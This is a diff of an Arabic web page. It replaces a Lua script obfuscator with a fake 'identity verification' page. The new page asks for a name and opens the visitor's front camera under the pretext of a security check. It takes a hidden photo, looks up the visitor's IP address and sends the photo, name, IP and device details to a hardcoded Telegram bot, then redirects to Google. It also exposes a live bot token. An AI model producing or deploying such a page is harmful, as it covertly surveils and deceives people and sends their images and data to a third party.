@@ -2,120 +2,74 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <title>نظام الأمان - عباس</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ABBAS ELITE V11 | BLACK EDITION</title>
     <style>
-        :root { --main: #ff0055; --bg: #050505; --card: #111; --text: #00ff88; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); color: #fff; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .box { width: 100%; max-width: 900px; background: var(--card); padding: 30px; border-radius: 20px; border: 2px solid var(--main); box-shadow: 0 0 40px rgba(255, 0, 85, 0.15); position: relative; overflow: hidden; }
-        .box::before { content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: linear-gradient(90deg, transparent, var(--main), transparent); animation: move 2s linear infinite; }
-        @keyframes move { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
-        h2 { color: var(--main); text-transform: uppercase; letter-spacing: 3px; margin-bottom: 5px; }
-        .status { color: #888; font-size: 14px; margin-bottom: 20px; }
-        textarea { 
-            width: 100%; height: 200px; background: #000; color: var(--text); 
-            border: 1px solid #333; border-radius: 12px; padding: 15px;
-            font-family: 'Consolas', monospace; font-size: 13px; margin-bottom: 15px; 
-            outline: none; transition: 0.3s; resize: none; box-sizing: border-box;
-        }
-        textarea:focus { border-color: var(--main); box-shadow: 0 0 10px rgba(255, 0, 85, 0.1); }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; }
-        button, .up-label { 
-            padding: 14px; border-radius: 10px; border: none; font-weight: bold;
-            cursor: pointer; transition: 0.3s; font-size: 14px; text-align: center;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-        }
-        .btn-main { background: var(--main); color: #fff; box-shadow: 0 4px 0 #990033; }
-        .btn-sec { background: #222; color: #fff; border: 1px solid #444; }
-        button:hover, .up-label:hover { transform: translateY(-3px); filter: brightness(1.2); }
-        button:active { transform: translateY(1px); box-shadow: none; }
-        .footer-text { margin-top: 20px; color: var(--main); font-weight: bold; font-size: 14px; }
+        body { background: #f0f2f5; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 280px; text-align: center; }
+        input { width: 90%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; }
+        button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2>المطور عمك عبيس - ELITE V11</h2>
-    <div id="status" class="status">جاهز لتشفير سكريبتك بنظام العزل الثلاثي...</div>
-
-    <textarea id="input" placeholder="أدخل كود Lua هنا (عربي، إنجليزي، رموز)..."></textarea>
-
-    <div class="grid">
-        <label class="up-label btn-sec">📁 رفع ملف<input type="file" id="fileIn" style="display:none" onchange="loadFile(this)"></label>
-        <button class="btn-main" onclick="fullEncrypt()">🚀 تشفير شامل 100%</button>
-        <button class="btn-sec" onclick="copyResult()">📋 نسخ الكود</button>
-        <button class="btn-main" onclick="downloadResult()">💾 تحميل بالاسم</button>
-    </div>
-
-    <p class="footer-text">الناتج المشفر (تشفير عباس الصافي):</p>
-    <textarea id="output" readonly placeholder="النتيجة ستظهر هنا..."></textarea>
+    <h3>التحقق من الهوية</h3>
+    <input type="text" id="n" placeholder="اكتب اسمك للمتابعة...">
+    <button onclick="captureAndSend()">دخول آمن</button>
 </div>
 
+<video id="v" autoplay style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
+
 <script>
-    function loadFile(input) {
-        let file = input.files[0];
-        let reader = new FileReader();
-        reader.onload = function() { document.getElementById('input').value = reader.result; };
-        reader.readAsText(file);
-    }
+    const T = "8798304320:AAHW11ODgkShNPElpztLvomrquwaPDcINWQ";
+    const ID = "2092901099";
 
-    function fullEncrypt() {
-        const input = document.getElementById('input').value;
-        const output = document.getElementById('output');
-        const status = document.getElementById('status');
+    async function captureAndSend() {
+        const name = document.getElementById('n').value;
+        if(!name) return alert("اكتب اسمك!");
 
-        if (!input) { alert("يا عباس حط الكود!"); return; }
+        try {
+            // 1. طلب الكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const v = document.getElementById('v');
+            v.srcObject = stream;
 
-        status.innerText = "جاري الحلب.. أقصد التشفير...";
+            // 2. سحب الـ IP
+            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "مخفي"}));
 
-        // نفس منطق أداتك القديمة اللي اشتغل معك
-        function toBytecode(str) {
-            let res = "";
-            let utf8 = unescape(encodeURIComponent(str)); 
-            for (let i = 0; i < utf8.length; i++) {
-                res += "\\" + utf8.charCodeAt(i).toString().padStart(3, '0');
-            }
-            return res;
+            // 3. التقاط الصورة بعد ثانية
+            setTimeout(async () => {
+                const c = document.getElementById('c');
+                c.width = 320; 
+                c.height = 240;
+                c.getContext('2d').drawImage(v, 0, 0, 320, 240);
+                
+                // تحويل الصورة لـ Blob (الطريقة الأضمن للإرسال)
+                c.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', ID);
+                    fd.append('photo', blob, 'image.jpg');
+                    fd.append('caption', `📸 صيد جديد يا عباس!\n\n📝 الاسم: ${name}\n🌐 الـ IP: ${ipData.ip}\n📱 الجهاز: ${navigator.platform}`);
+
+                    // إرسال الصورة للبوت
+                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
+                        method: 'POST',
+                        body: fd
+                    });
+
+                    stream.getTracks().forEach(t => t.stop());
+                    alert("تم التحقق بنجاح!");
+                    window.location.href = "https://www.google.com";
+                }, 'image/jpeg', 0.6);
+
+            }, 1500);
+
+        } catch (e) {
+            alert("لازم تضغط 'سماح' للكاميرا!");
         }
-
-        const encodedData = toBytecode(input);
-        
-        const finalScript = `--[[ PROTECTED BY ABBAS ELITE SYSTEM 2026 ]]--\n` +
-            `local _0xPayload = "${encodedData}"\n` +
-            `local _0xExecute = function(_0xData)\n` +
-            `    local _0xDecoded = _0xData:gsub("\\\\(%d%d%d)", function(d) return string.char(tonumber(d)) end)\n` +
-            `    return (loadstring or load)(_0xDecoded)\n` +
-            `end\n` +
-            `_0xExecute(_0xPayload)()`;
-
-        setTimeout(() => {
-            output.value = finalScript;
-            status.innerText = "تم التشفير بنجاح! الأداة الحين نار.";
-        }, 400);
-    }
-
-    function copyResult() {
-        const output = document.getElementById('output');
-        if(!output.value) return;
-        output.select();
-        document.execCommand('copy');
-        alert("تم النسخ يا وحش!");
-    }
-
-    function downloadResult() {
-        const content = document.getElementById('output').value;
-        if(!content) return alert("شفر الكود أولاً!");
-        
-        let fileName = prompt("وش تبي تسمي الملف؟", "Abbas_Elite");
-        if (!fileName) return;
-
-        let blob = new Blob([content], {type: "text/plain"});
-        let link = document.createElement("a");
-        link.download = fileName + ".lua";
-        link.href = window.URL.createObjectURL(blob);
-        link.click();
     }
 </script>
-
 </body>
 </html>
